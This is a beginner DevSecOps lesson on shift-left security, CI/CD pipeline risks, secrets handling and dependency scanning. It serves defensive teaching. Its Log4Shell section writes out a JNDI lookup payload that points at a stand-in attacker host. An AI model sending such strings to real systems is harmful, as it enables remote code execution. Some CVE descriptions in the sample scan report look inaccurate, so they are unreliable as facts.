# Lesson 4.13: DevSecOps Foundations

**Module 4: DevSecOps**  
**Duration:** 3 hours  
**Level:** Beginner

---

## Learning Objectives

By the end of this lesson, you will be able to:

1. **Explain** what DevSecOps is and how it differs from traditional DevOps
2. **Describe** the shift-left security approach and its benefits
3. **Identify** common security risks in CI/CD pipelines
4. **Understand** secrets management and why it matters
5. **Recognize** dependency vulnerabilities and their impact

---

## Prerequisites

Before starting this lesson, ensure you have:

- Completed Lesson 4.7 (CI with CircleCI)
- Completed Lesson 4.12 (Continuous Deployment)
- Understanding of CI/CD pipelines
- Basic understanding of Docker

---

## Introduction

In previous lessons, you learned to build automated CI/CD pipelines that build, test, and deploy applications. But there's a critical piece missing: **security**.

Traditional approaches treated security as a final step before deployment - security teams would review code at the end. This caused delays, expensive fixes, and sometimes security vulnerabilities reaching production.

**DevSecOps** changes this by integrating security throughout the entire development lifecycle. In this lesson, you'll learn the principles and practices that make applications secure from the start.

---

## Part 1 - What is DevSecOps? (20 minutes)

### Definition

**DevSecOps** = Development + Security + Operations

DevSecOps is a philosophy and practice that integrates security into every phase of the software development lifecycle, from initial design through deployment and maintenance.

**Key idea:** Security is everyone's responsibility, not just the security team's job.

---

### Traditional Approach vs DevSecOps

**Traditional Security Approach:**

```
Developer → Write Code → Security Team Review → Fix Issues → Deploy
  (weeks)      (weeks)         (days/weeks)        (days)      (finally!)
```

**Problems:**
- Security checks happen too late
- Expensive to fix issues late in cycle
- Delays deployment
- Creates conflict between dev and security teams
- Vulnerabilities may slip through

---

**DevSecOps Approach:**

```
Developer → Write Code (with security tools running) → Auto Security Checks → Deploy
            └─ IDE security plugins                  └─ Pipeline scans
            └─ Secure coding practices              └─ Automated tests
```

**Benefits:**
- Security issues caught immediately
- Cheaper to fix early
- Faster deployment
- Security integrated, not bolted on
- Collaboration between teams

---

### Why DevSecOps Matters

**Real-world statistics:**

- **60%** of data breaches involve vulnerabilities for which a patch was available but not applied
- It costs **100x more** to fix a security bug in production vs during development
- **84%** of security breaches exploit known vulnerabilities in applications

**Sources:** Various industry reports (Verizon DBIR, Ponemon Institute)

---

### Real-World Example: Equifax Breach (2017)

**What happened:**
- Equifax had a known vulnerability in Apache Struts (a Java library)
- Patch was available for 2 months
- They didn't update the dependency
- Hackers exploited the vulnerability
- **Result:** 147 million people's data stolen

**Cost:**
- Over $1.4 billion in settlements
- Massive reputation damage
- Could have been prevented with dependency scanning in CI/CD pipeline

**This is why DevSecOps matters!**

---

### DevSecOps Principles

**1. Security as Code**
- Security policies written as code
- Automated security checks in pipeline
- Version controlled like application code

**2. Continuous Security**
- Security checks run on every commit
- Not just once at the end
- Feedback loops for immediate action

**3. Collaboration**
- Developers, security, and ops work together
- Shared responsibility
- Security champions in dev teams

**4. Automation**
- Manual security reviews don't scale
- Automated scanning catches common issues
- Humans focus on complex threats

**5. Measurement**
- Track security metrics
- Monitor vulnerabilities over time
- Measure improvement

---

### DevSecOps Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    DevSecOps Lifecycle                       │
└─────────────────────────────────────────────────────────────┘

    Plan          Code          Build         Test         Deploy
     │             │              │            │             │
     ▼             ▼              ▼            ▼             ▼
┌─────────┐  ┌─────────┐   ┌─────────┐  ┌─────────┐  ┌─────────┐
│ Threat  │  │  Secure │   │Dependency│  │Security │  │Runtime  │
│Modeling │  │  Coding │   │ Scanning │  │ Testing │  │Monitoring│
└─────────┘  └─────────┘   └─────────┘  └─────────┘  └─────────┘
     │             │              │            │             │
     └─────────────┴──────────────┴────────────┴─────────────┘
                         Security Feedback Loop
```

**Reference image:**
https://www.redhat.com/rhdc/managed-files/styles/wysiwyg_full_width/private/devsecops-lifecycle_1.png

---

## Part 2 - Shift-Left Security (20 minutes)

### What is Shift-Left?

**"Shift-left"** means moving security checks earlier in the development process.

**Traditional approach (Shift-Right):**

```
Development → Testing → Security Review → Production
                              ↑
                         Security happens here
                         (too late!)
```

**Shift-Left approach:**

```
Development → Testing → Security Review → Production
     ↑
Security happens here
(catch issues early!)
```

---

### Why Shift-Left?

**Cost of fixing bugs by phase:**

| Phase | Relative Cost | Time to Fix |
|-------|---------------|-------------|
| Development | 1x | Minutes |
| Testing | 10x | Hours |
| Pre-production | 100x | Days |
| Production | 1000x | Weeks |

**Example:**
- Fix during coding: 30 minutes
- Fix in production: 2 weeks + emergency deployment

---

### Benefits of Shift-Left Security

**1. Faster Feedback**
- Developers learn about issues immediately
- Fix while context is fresh in mind
- No waiting days/weeks for security review

**2. Lower Costs**
- Cheaper to fix early
- Less rework
- Fewer emergency patches

**3. Better Security**
- More issues caught
- Security becomes habit
- Preventive rather than reactive

**4. Happier Teams**
- No last-minute surprises
- Developers feel empowered
- Security team focuses on complex issues

---

### Shift-Left in Practice

**What developers do:**

**Before writing code:**
- Review security requirements
- Understand common vulnerabilities
- Use secure coding guidelines

**While writing code:**
- IDE plugins highlight security issues
- Code reviews include security checks
- Pair programming with security awareness

**Before committing:**
- Run security linters locally
- Check for hardcoded secrets
- Review dependencies

**In CI/CD pipeline:**
- Automated dependency scanning
- Static code analysis
- Security unit tests
- Container image scanning

---

### Example: Shift-Left in Action

**Scenario:** Developer adds a new dependency to pom.xml

**Without Shift-Left:**
```
Day 1: Developer adds dependency
Day 30: Code reaches security review
Day 31: Security finds vulnerability in dependency
Day 32-35: Developer (forgot context) must fix
Day 36: Retest everything
Day 37: Finally deploy
```

**With Shift-Left:**
```
Day 1, 2:00 PM: Developer adds dependency
Day 1, 2:05 PM: Pipeline runs, finds vulnerability
Day 1, 2:15 PM: Developer sees alert
Day 1, 2:30 PM: Developer updates to safe version
Day 1, 2:35 PM: Pipeline passes, deploys
```

**Result:** 36 days → 35 minutes!

---

### Shift-Left Security Diagram

```
┌────────────────────────────────────────────────────────────┐
│          Traditional: Security at the End (Slow)           │
└────────────────────────────────────────────────────────────┘

  Plan → Code → Build → Test → Security Check → Production
                              └─────────┬─────────┘
                                 Issues found late
                                 Expensive to fix


┌────────────────────────────────────────────────────────────┐
│         Shift-Left: Security Throughout (Fast)             │
└────────────────────────────────────────────────────────────┘

  Plan → Code → Build → Test → Security Check → Production
   ↓      ↓      ↓       ↓           ↓             ↓
  Sec    Sec    Sec     Sec         Sec           Sec
         Issues caught early - cheap to fix
```

---

## Part 3 - Pipeline Security Risks (25 minutes)

### Common Security Risks in CI/CD Pipelines

Your CI/CD pipeline is a critical part of your infrastructure. If compromised, attackers can inject malicious code into your application.

Let's understand the main risks:

---

### Risk 1: Hardcoded Secrets in Code

**What are secrets?**
- API keys
- Database passwords
- Private keys
- OAuth tokens
- Encryption keys

**The problem:**

```java
// BAD - Hardcoded secret
public class DatabaseConfig {
    private static final String DB_PASSWORD = "MySecretPassword123";
}
```

**Why this is dangerous:**
- Pushed to GitHub (now public!)
- Visible in commit history forever
- Anyone with repo access sees secrets
- Attackers scan GitHub for exposed secrets

**Real example:**
- Developer accidentally commits credentials to GitHub
- Within 2 minutes, bots find it
- Attacker uses credentials to access systems
- Company faces major security breach

---

### Risk 2: Vulnerable Dependencies

**What are dependencies?**
- External libraries your code uses
- Example: Spring Boot, PostgreSQL driver, Jackson JSON

**The problem:**

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.30</version>  <!-- OLD VERSION WITH KNOWN VULNERABILITY! -->
</dependency>
```

**Why this is dangerous:**
- Old versions have known security flaws (CVEs)
- Attackers actively exploit these
- Easy target - vulnerability details are public

**Example:**
- Log4Shell vulnerability (December 2021)
- Affected millions of Java applications
- Allowed remote code execution
- Companies had to patch urgently

---

### Risk 3: Insecure Container Images

**The problem:**

```dockerfile
# BAD - Using old/vulnerable base image
FROM node:10
```

**Why this is dangerous:**
- Base images may have vulnerabilities
- Old versions don't get security patches
- Inherit all vulnerabilities from base image

**Better:**

```dockerfile
# GOOD - Using recent, maintained version
FROM node:20-alpine
```

---

### Risk 4: Insufficient Access Controls

**The problem:**
- Too many people have admin access to CI/CD
- Developers can modify pipeline configuration
- No code review for pipeline changes

**Why this is dangerous:**
- Attacker compromises one developer account
- Modifies pipeline to inject malware
- Malware deployed to production

**Example attack:**
- Hacker gets developer's credentials
- Adds step to pipeline: "Upload sensitive data to attacker's server"
- Code looks normal but pipeline steals data

---

### Risk 5: No Security Scanning in Pipeline

**The problem:**
- Pipeline only checks if code compiles
- Doesn't check for security issues
- Vulnerable code reaches production

**Why this is dangerous:**
- Security issues discovered too late
- Expensive emergency patches
- Potential data breaches

---

### Attack Scenarios

**Scenario 1: Supply Chain Attack**
```
1. Attacker compromises a popular npm package
2. Your pipeline downloads the malicious version
3. Malicious code included in your application
4. Deployed to production
5. Attacker has backdoor access
```

**Scenario 2: Leaked Credentials**
```
1. Developer commits credentials to GitHub
2. Automated bot finds it in 2 minutes
3. Attacker uses credentials to access your databases
4. Steals customer data
5. Demands ransom
```

**Scenario 3: Vulnerable Dependency**
```
1. Your app uses old library with CVE
2. Attacker scans internet for vulnerable apps
3. Finds your app, exploits vulnerability
4. Gains access to server
5. Installs ransomware
```

---

### Pipeline Security Diagram

```
┌────────────────────────────────────────────────────────────┐
│              Secure CI/CD Pipeline                          │
└────────────────────────────────────────────────────────────┘

  Code Push
      ↓
  ┌─────────────────┐
  │ Source Control  │ ← Access Control (who can commit?)
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │   Build Stage   │ ← No hardcoded secrets
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │  Security Scan  │ ← Dependency check, SAST, DAST
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │   Test Stage    │ ← Security tests included
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │ Container Scan  │ ← Image vulnerability scan
  └────────┬────────┘
           ↓
  ┌─────────────────┐
  │    Deploy       │ ← Secure secrets injection
  └─────────────────┘
```

**Reference:**
https://www.aquasec.com/cloud-native-academy/supply-chain-security/ci-cd-pipeline-security/

---

## Part 4 - Secrets Management (30 minutes)

### What are Secrets?

**Secrets** are sensitive pieces of information that your application needs to function:

- Database passwords
- API keys (Stripe, SendGrid, AWS)
- Private SSH keys
- OAuth client secrets
- Encryption keys
- Service account credentials

---

### The Problem: Hardcoded Secrets

**Bad example:**

```java
public class EmailService {
    private static final String API_KEY = "YOUR_API_KEY_HERE";
    
    public void sendEmail(String to, String subject, String body) {
        // Use hardcoded API key
    }
}
```

**Why this is terrible:**

1. **Exposed in Git**
   - Committed to repository
   - Visible in commit history forever
   - Even if deleted later, still in history

2. **Visible to everyone**
   - Anyone with repo access sees secrets
   - Contractors, interns, ex-employees
   - If repo is public, entire world sees it

3. **Can't rotate easily**
   - If key is compromised, must change everywhere
   - Need to update code, rebuild, redeploy
   - Downtime during rotation

4. **Same secrets everywhere**
   - Development, staging, production use same key
   - Breach in one environment affects all

---

### Real-World Horror Stories

**Story 1: Uber (2016)**
- Uber developers committed credentials to GitHub
- Attackers found credentials, accessed cloud storage
- **Result:** 57 million user records stolen
- **Cost:** $148 million settlement

**Story 2: Toyota (2023)**
- Access key hardcoded in public GitHub repo for 5 years
- Anyone could access Toyota's cloud system
- **Result:** 2.15 million customer records exposed

**Story 3: Startup Horror**
- Startup commits payment API credentials to GitHub
- Bot finds it in minutes
- Attacker charges thousands to multiple accounts
- **Result:** Company almost bankrupt

---

### The Solution: Environment Variables

**Environment variables** store secrets outside your code.

**Good example:**

```java
public class EmailService {
    private final String apiKey;
    
    public EmailService() {
        // Read from environment variable
        this.apiKey = System.getenv("SENDGRID_API_KEY");
    }
    
    public void sendEmail(String to, String subject, String body) {
        // Use apiKey from environment
    }
}
```

**Benefits:**

1. **Not in code**
   - Never committed to Git
   - Not visible in repo
   - No history trail

2. **Different per environment**
   - Dev uses dev keys
   - Production uses production keys
   - Isolated and secure

3. **Easy rotation**
   - Change environment variable
   - Restart application
   - No code changes needed

4. **Access controlled**
   - Only ops/devops can set production secrets
   - Developers don't need production keys
   - Principle of least privilege

---

### How Environment Variables Work

**In CI/CD (CircleCI):**

1. **Set in CircleCI dashboard:**
   - Project Settings → Environment Variables
   - Add: `SENDGRID_API_KEY = <your-actual-key>`
   - CircleCI encrypts and stores it

2. **Use in pipeline:**
   ```yml
   - run:
       name: Deploy
       command: |
         echo "Using API Key from environment"
   ```

3. **Application reads it:**
   ```java
   String apiKey = System.getenv("SENDGRID_API_KEY");
   ```

---

### Best Practices for Secrets

**1. Never commit secrets to Git**
```bash
# Create .env file for local development
echo "DATABASE_PASSWORD=localdev123" > .env

# Add to .gitignore
echo ".env" >> .gitignore
```

**2. Use different secrets per environment**
```
Development:  DATABASE_PASSWORD=dev_password_123
Staging:      DATABASE_PASSWORD=staging_secure_456
Production:   DATABASE_PASSWORD=prod_ultra_secure_789
```

**3. Rotate secrets regularly**
- Change passwords every 90 days
- Rotate after employee leaves
- Rotate after suspected breach

**4. Use secret management tools**
- AWS Secrets Manager
- HashiCorp Vault
- Azure Key Vault
- GitHub Secrets (for GitHub Actions)

**5. Scan for exposed secrets**
- Use tools like `git-secrets` or `truffleHog`
- Scan commits before pushing
- Automated scanning in CI/CD

---

### What NOT to do

❌ **Hardcode in source code**
```java
String password = "MyPassword123";
```

❌ **Commit .env files**
```bash
git add .env  # DON'T DO THIS!
```

❌ **Put in config files in Git**
```properties
# application.properties - DON'T COMMIT THIS!
database.password=secretpassword
```

❌ **Share via Slack/Email**
```
Hey John, the production DB password is: <password>
```

❌ **Put in comments**
```java
// Production API key: <your-key-here>
```

---

### Environment Variables in Spring Boot

**Application uses environment variables:**

```properties
# application.properties
# Don't hardcode values
spring.datasource.url=${DATABASE_URL}
spring.datasource.username=${DATABASE_USERNAME}
spring.datasource.password=${DATABASE_PASSWORD}
```

**Set variables in CircleCI:**
- `DATABASE_URL=jdbc:postgresql://...`
- `DATABASE_USERNAME=myuser`
- `DATABASE_PASSWORD=securepassword123`

**Spring Boot automatically reads them!**

---

## Part 5 - Dependency Vulnerabilities (40 minutes)

### What are Dependencies?

**Dependencies** are external libraries/packages your application uses.

**Example - Your Spring Boot pom.xml:**
```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.postgresql</groupId>
        <artifactId>postgresql</artifactId>
    </dependency>
    <!-- Your app depends on these libraries -->
</dependencies>
```

**Your application doesn't work without them!**

---

### Why Dependencies Matter

**Modern applications use LOTS of dependencies:**

- Typical Java application: 50-200 dependencies
- Each dependency may have its own dependencies
- You might indirectly use 500+ libraries

**Example dependency tree:**

```
Your App
├── Spring Boot
│   ├── Spring Core
│   ├── Spring Web
│   │   ├── Tomcat
│   │   └── Jackson JSON
│   └── Logging Framework
├── PostgreSQL Driver
└── JUnit (for tests)
```

**You depend on ALL of these!**

---

### What are CVEs?

**CVE = Common Vulnerabilities and Exposures**

A CVE is a publicly disclosed security vulnerability with:
- Unique ID (e.g., CVE-2021-44228)
- Description of the vulnerability
- Affected versions
- Severity score (0-10)

**CVE Severity Scores:**

| Score | Severity | Description |
|-------|----------|-------------|
| 9.0-10.0 | Critical | Immediate action required |
| 7.0-8.9 | High | Fix as soon as possible |
| 4.0-6.9 | Medium | Should fix |
| 0.1-3.9 | Low | Minor risk |

---

### Real-World Example: Log4Shell (CVE-2021-44228)

**What happened:**
- December 2021
- Vulnerability found in Log4j (Java logging library)
- **Score:** 10.0 (CRITICAL)
- Allowed remote code execution
- Affected millions of applications worldwide

**The vulnerability:**
```java
// Attacker sends this string:
String malicious = "${jndi:ldap://attacker.com/evil}";

// Log4j processes it and...
logger.info("User input: " + malicious);

// ...executes attacker's code!
```

**Impact:**
- Minecraft servers compromised
- iCloud vulnerable
- Tesla affected
- Government systems at risk

**Fix:**
- Update Log4j from 2.14.1 → 2.17.0
- Emergency patches worldwide
- Cost: Billions in remediation

**Lesson:** One vulnerable dependency can affect millions!

---

### How Vulnerabilities are Discovered

**1. Security researchers find flaws**
- Test popular libraries
- Report to maintainers
- CVE assigned

**2. Hackers exploit before it's public (Zero-day)**
- Vulnerability unknown to public
- Used in attacks
- Eventually discovered

**3. Automated scanning finds issues**
- Tools analyze code
- Find potential vulnerabilities
- Report to maintainers

---

### Dependency Vulnerability Lifecycle

```
┌─────────────────────────────────────────────────────────┐
│            Dependency Vulnerability Lifecycle           │
└─────────────────────────────────────────────────────────┘

1. Vulnerability Discovered
   ↓
2. CVE Published (made public)
   ↓
3. Attackers Start Exploiting
   ↓
4. Maintainers Release Patch
   ↓
5. Organizations Must Update ← YOU ARE HERE
   ↓
6. Vulnerability Mitigated
```

**Critical window:** Between CVE publication and your update!

---

### Example Vulnerable Dependencies

**Example 1: Old Spring Boot**

```xml
<!-- Vulnerable -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <version>2.5.0</version>  <!-- OLD! Has CVE-2021-22118 -->
</dependency>

<!-- Fixed -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <version>2.5.12</version>  <!-- Patched version -->
</dependency>
```

---

**Example 2: Old PostgreSQL Driver**

```xml
<!-- Vulnerable -->
<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.2.5</version>  <!-- Has SQL injection vulnerability -->
</dependency>

<!-- Fixed -->
<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.5.0</version>  <!-- Secure version -->
</dependency>
```

---

### How to Check for Vulnerabilities

**Manual checking (tedious):**
1. Go to https://nvd.nist.gov/
2. Search for each dependency
3. Check if your version is vulnerable
4. Repeat for 50+ dependencies
5. Takes hours!

**Automated scanning (better):**
1. Run dependency scanning tool
2. Tool checks all dependencies
3. Matches against CVE database
4. Generates report
5. Takes seconds!

---

### Dependency Scanning Tools

**Popular tools:**

1. **OWASP Dependency-Check**
   - Free and open-source
   - Supports Java, .NET, Python, Node.js
   - CLI and CI/CD integration

2. **Snyk**
   - Free for open-source projects
   - Great GitHub integration
   - Automated pull requests for fixes

3. **GitHub Dependabot**
   - Built into GitHub
   - Automatic security alerts
   - Auto-creates PRs to fix vulnerabilities

4. **WhiteSource/Mend**
   - Enterprise tool
   - License compliance + security
   - Commercial product

**In Lesson 4.14, we'll use OWASP Dependency-Check!**

---

### Example Vulnerability Report

```
==================================================
OWASP Dependency-Check Report
==================================================

HIGH SEVERITY VULNERABILITIES:

1. spring-core-5.3.10.jar
   CVE: CVE-2021-22096
   Severity: HIGH (7.5)
   Description: Spring Framework RCE vulnerability
   Recommendation: Update to 5.3.16 or later

2. postgresql-42.2.5.jar
   CVE: CVE-2022-31197
   Severity: MEDIUM (6.5)
   Description: SQL injection in PostgreSQL JDBC
   Recommendation: Update to 42.5.0 or later

SUMMARY:
Total Dependencies: 47
Vulnerable Dependencies: 2
Critical: 0
High: 1
Medium: 1
Low: 0
==================================================
```

---

### Why Dependency Scanning in CI/CD?

**Without scanning:**
```
Developer adds dependency
    ↓
Code works, tests pass
    ↓
Deploy to production
    ↓
3 months later: CVE published
    ↓
Discover you're vulnerable
    ↓
Emergency patch
```

**With scanning in CI/CD:**
```
Developer adds dependency
    ↓
Pipeline runs dependency scan
    ↓
Scan finds vulnerability
    ↓
Pipeline FAILS ← Caught immediately!
    ↓
Developer updates to safe version
    ↓
Pipeline passes, deploys
```

---

### Transitive Dependencies

**Problem:** You don't control all dependencies!

**Example:**
```
Your pom.xml:
└── spring-boot-starter-web (you added this)
    └── spring-web (indirect)
        └── spring-beans (indirect)
            └── VULNERABLE LIBRARY (you didn't know!)
```

**You're vulnerable even though you didn't directly add it!**

**Dependency scanning catches these!**

---

### Best Practices

**1. Keep dependencies up to date**
```bash
# Check for updates regularly
mvn versions:display-dependency-updates
```

**2. Use dependency scanning in CI/CD**
```yml
# Run on every build
- dependency-check
```

**3. Don't ignore warnings**
```
"Oh, it's just a Medium severity, I'll fix it later..."
← This is how breaches happen!
```

**4. Review dependency updates**
```
Don't blindly update everything!
- Read changelogs
- Test thoroughly
- Update incrementally
```

**5. Remove unused dependencies**
```xml
<!-- Do you really need this? -->
<dependency>
    <artifactId>some-library-we-tried-once</artifactId>
</dependency>
```

---

## Part 6 - Security Scanning Tools Overview (15 minutes)

### Types of Security Scanning

**1. SAST (Static Application Security Testing)**
- Analyzes source code without running it
- Finds coding errors (SQL injection, XSS)
- Example tools: SonarQube, Checkmarx

**2. DAST (Dynamic Application Security Testing)**
- Tests running application
- Simulates attacks
- Example tools: OWASP ZAP, Burp Suite

**3. Dependency Scanning**
- Checks libraries for known vulnerabilities
- Matches against CVE database
- Example tools: OWASP Dependency-Check, Snyk

**4. Container Scanning**
- Scans Docker images
- Checks base image and layers
- Example tools: Trivy, Clair, Snyk

**5. Secret Scanning**
- Finds hardcoded secrets
- Scans commits and code
- Example tools: git-secrets, TruffleHog

---

### What We'll Use in Lesson 4.14

**OWASP Dependency-Check**

**Why this tool?**
- ✅ Free and open-source
- ✅ Easy to integrate with CircleCI
- ✅ Works with Java/Maven (your project)
- ✅ Beginner-friendly
- ✅ Well-documented
- ✅ Widely used in industry

**What it does:**
1. Scans your `pom.xml`
2. Identifies all dependencies
3. Checks against National Vulnerability Database
4. Generates HTML report
5. Fails build if critical vulnerabilities found

---

### OWASP Dependency-Check Example

**Command:**
```bash
mvn org.owasp:dependency-check-maven:check
```

**What happens:**
1. Downloads latest CVE database
2. Analyzes all dependencies in pom.xml
3. Matches versions against known vulnerabilities
4. Creates report: `target/dependency-check-report.html`

**Report includes:**
- List of all dependencies
- Which have vulnerabilities
- CVE details
- Recommended fixes
- Risk scores

---

### Integration with CI/CD

**In your CircleCI config (preview for 4.14):**

```yml
jobs:
  security_scan:
    docker:
      - image: cimg/openjdk:21.0
    steps:
      - checkout
      - run:
          name: Run Dependency Check
          command: mvn org.owasp:dependency-check-maven:check
      - store_artifacts:
          path: target/dependency-check-report.html
```

**Result:**
- Runs on every commit
- Catches vulnerabilities immediately
- Prevents vulnerable code from reaching production

---

### Other Tools (Reference)

**For future learning:**

1. **Snyk** - https://snyk.io/
   - Great for beginners
   - Free tier available
   - Excellent GitHub integration

2. **SonarQube** - https://www.sonarqube.org/
   - Code quality + security
   - Free community edition
   - Enterprise features available

3. **Trivy** - https://github.com/aquasecurity/trivy
   - Container scanning
   - Fast and comprehensive
   - Easy to use

4. **GitHub Advanced Security**
   - Built into GitHub
   - Dependency alerts
   - Code scanning
   - Secret scanning

---

### Security Scanning in DevSecOps Pipeline

```
┌────────────────────────────────────────────────────────────┐
│         Complete DevSecOps Pipeline with Scanning          │
└────────────────────────────────────────────────────────────┘

Code Push
    ↓
┌─────────────────┐
│  Build          │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Unit Tests     │
└────────┬────────┘
         ↓
┌─────────────────┐
│  SAST Scan      │ ← Check source code
└────────┬────────┘
         ↓
┌─────────────────┐
│ Dependency Scan │ ← Check libraries (OWASP)
└────────┬────────┘
         ↓
┌─────────────────┐
│ Build Container │
└────────┬────────┘
         ↓
┌─────────────────┐
│ Container Scan  │ ← Check Docker image
└────────┬────────┘
         ↓
┌─────────────────┐
│  Deploy         │
└─────────────────┘

If ANY scan fails → Pipeline stops!
```

---

## Summary

### What You Learned Today

1. ✅ **DevSecOps** integrates security throughout development lifecycle
2. ✅ **Shift-Left** means catching security issues early (cheaper, faster)
3. ✅ **Pipeline Risks** include hardcoded secrets, vulnerable dependencies, insecure containers
4. ✅ **Secrets Management** uses environment variables, not hardcoded values
5. ✅ **Dependency Vulnerabilities** are tracked as CVEs and need scanning
6. ✅ **Security Scanning Tools** automate vulnerability detection

---

### Key Takeaways

**DevSecOps Mindset:**
- Security is everyone's responsibility
- Automate security checks
- Find and fix issues early
- Continuous improvement

**Critical Practices:**
- Never hardcode secrets
- Use environment variables
- Scan dependencies regularly
- Keep libraries updated
- Integrate security into CI/CD

**Cost of Security Issues:**
- Fix during development: Minutes
- Fix in production: Weeks + reputation damage
- Shift-left saves time and money

---

### Real-World Impact

**Companies with Good DevSecOps:**
- Deploy 46x more frequently
- 96x faster mean time to recovery
- 7x lower change failure rate
- Less time fighting fires

**Companies WITHOUT DevSecOps:**
- Slow deployments
- Expensive breaches
- Reputation damage
- Regulatory fines

---

### Preparing for Lesson 4.14

**In the next lesson, you will:**
1. Add dependency scanning to your CircleCI pipeline
2. Run security scans on your devops-demo project
3. Read vulnerability reports
4. Fix a vulnerability by updating a dependency
5. See how security checks prevent vulnerable code from deploying

**What to review before next lesson:**
- Your CircleCI config from Lesson 4.7
- Your devops-demo project structure
- How to edit .circleci/config.yml

---

## Additional Resources

### DevSecOps Concepts
- [OWASP DevSecOps Guideline](https://owasp.org/www-project-devsecops-guideline/)
- [DevSecOps Manifesto](https://www.devsecops.org/)
- [NIST DevSecOps Reference Architecture](https://csrc.nist.gov/publications/detail/sp/800-204c/final)

### Security Vulnerabilities
- [National Vulnerability Database](https://nvd.nist.gov/)
- [CVE Database](https://cve.mitre.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Tools Documentation
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
- [Snyk](https://snyk.io/learn/)
- [GitHub Security Features](https://docs.github.com/en/code-security)

### Videos
- [What is DevSecOps?](https://www.youtube.com/results?search_query=what+is+devsecops)
- [Shift-Left Security Explained](https://www.youtube.com/results?search_query=shift+left+security)
- [Log4Shell Explained](https://www.youtube.com/results?search_query=log4shell+explained)

---

**End of Lesson 4.13**

**Congratulations!** You now understand the fundamentals of DevSecOps and why security must be integrated throughout the development lifecycle. In the next lesson, you'll put these concepts into practice! 🎉

**Next Lesson:** Lesson 4.14 - DevSecOps Practicals (Hands-on Implementation)